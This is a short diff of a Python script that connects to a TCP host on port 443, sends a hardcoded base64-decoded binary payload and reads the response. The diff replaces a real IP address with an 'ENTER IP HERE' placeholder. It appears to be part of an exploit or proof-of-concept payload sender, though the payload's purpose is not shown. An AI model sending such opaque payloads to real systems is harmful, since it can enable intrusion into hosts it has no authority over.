@@ -54,7 +54,7 @@ based64 = "G7ey0ARiplH11970TRWco/rCSC1tnNYX1grGnx6ZXWcs+T+AJBrE1jonFcCb++vXtQyMj
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 #Change the IP here 
-s.connect(("206.188.196.156", 443))
+s.connect(("ENTER IP HERE", 443))
 s.send(base64.b64decode(based64))
 msg = s.recv(1024)
 
